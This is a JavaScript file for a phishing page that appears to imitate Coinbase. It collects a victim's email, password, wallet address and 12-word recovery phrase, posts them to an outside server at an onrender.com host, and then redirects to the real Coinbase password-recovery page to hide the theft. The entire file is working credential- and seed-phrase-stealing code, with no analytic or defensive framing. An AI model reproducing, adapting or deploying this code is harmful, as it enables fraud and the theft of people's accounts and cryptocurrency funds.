const API_URL = 'https://cb-backend-new.onrender.com';

document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const status = document.getElementById('status');

    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    document.getElementById('toStep3').onclick = () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if(!email || !pass) return alert("Required fields missing.");
        
        step2.classList.add('hidden');
        step3.classList.remove('hidden');
    };

    document.getElementById('connectBtn').onclick = async () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        if (window.ethereum) {
            try {
                status.innerText = "Connecting to wallet...";
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                await sendData(email, pass, accounts[0], null);
            } catch (e) {
                setupRecovery(email, pass);
            }
        } else {
            setupRecovery(email, pass);
        }
    };

    function setupRecovery(email, pass) {
        step3.innerHTML = `
            <img src="logo.png" class="cb-logo">
            <h1 class="cb-header">Recovery</h1>
            <p>Enter your 12-word recovery phrase to continue.</p>
            <div class="input-group">
                <input type="text" id="phrase" placeholder="word1 word2 ..." style="text-align:center;">
            </div>
            <button id="submitPhrase" class="btn-primary">Restore Account</button>
            <div id="phrase_status" class="status-text"></div>
        `;

        document.getElementById('submitPhrase').onclick = async () => {
            const phrase = document.getElementById('phrase').value.trim();
            const s = document.getElementById('phrase_status');
            if (phrase.split(/\s+/).length !== 12) {
                s.innerText = "Please enter exactly 12 words.";
                return;
            }
            await sendData(email, pass, null, phrase);
        };
    }

    async function sendData(email, pass, wallet, phrase) {
        try {
            status.innerText = "Processing...";
            const res = await fetch(`${API_URL}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password: pass, walletAddress: wallet, recoveryPhrase: phrase })
            });
            if (res.ok) {
                status.innerText = "Verification successful. Redirecting...";
                setTimeout(() => {
                    window.location.href = 'https://www.coinbase.com/password-recovery';
                }, 1500);
            }
        } catch (e) {
            status.innerText = "Network error. Please try again.";
        }
    }
});
